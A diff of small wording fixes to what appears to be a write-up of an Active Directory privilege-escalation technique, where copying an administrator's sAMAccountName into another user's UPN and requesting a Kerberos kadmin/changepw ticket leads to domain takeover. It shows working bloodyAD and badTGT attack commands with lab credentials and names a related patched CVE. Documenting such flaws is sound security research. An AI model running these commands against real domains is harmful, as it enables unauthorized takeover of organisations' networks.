@@ -24,9 +24,9 @@ The researcher was looking for uniqueness verification flaws in Active Directory
 
 This would allow an attacker having a `Write` right on a UPN to get a **Full Domain Takeover**.
 
-In the demo below the attacker has a `Write` right on `john` user UPN.
+In the demo below the attacker has a `Write` right on `john` user's UPN.
 
-### Step 1: Copy an Domain Admin `sAMAccountName` as a `userPrincipalName` value for another user
+### Step 1: Copy a Domain Admin `sAMAccountName` as a `userPrincipalName` value for another user
 
 ```bash
 bloodyAD -H 192.168.100.3 -d bloody -u john -p 'Password123!' get object 'Administrator' --attr sAMAccountName
@@ -40,7 +40,7 @@ bloodyAD -H 192.168.100.3 -d bloody -u john -p 'Password123!' set object john us
 
 ### Step 2: Generate a Kerberos credential cache for the change-password service
 
-Then we will request a TGT bound to the `kadmin/changepw` service context for **john** but using his UPN `Administrator` by providing `ptype=10` which tells Kerberos that the username we provided is of UPN type (`NT-ENTERPRISE(10)`) and not a sAMAccountName (`NT-PRINCIPAL(1)`):
+Then we will request a TGT bound to the `kadmin/changepw` service for **john** but using his UPN `Administrator` by providing `ptype=10` which tells Kerberos that the username we provided is of UPN type (`NT-ENTERPRISE(10)`) and not a sAMAccountName (`NT-PRINCIPAL(1)`):
 
 ```bash
 badTGT 'kerberos+pw://bloody.corp\Administrator:Password123!@192.168.100.3/?ptype=10' --ccache john.ccache --sname kadmin/changepw
@@ -116,6 +116,7 @@ KerberLoss is the companion CVE that appears in the Semperis research publicatio
  1. Denial-of-service to HOST-mapped services
  2. SPN-jacking (simplifies S4U attack)
  3. Authentication downgrade (Kerberos to NTLM)
+
 This vulnerability has been patched by Microsoft in [March 10, 2026](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-25177)
 
 A practical representation of that family of objects is the use of invisible Unicode characters in a servicePrincipalName attribute:
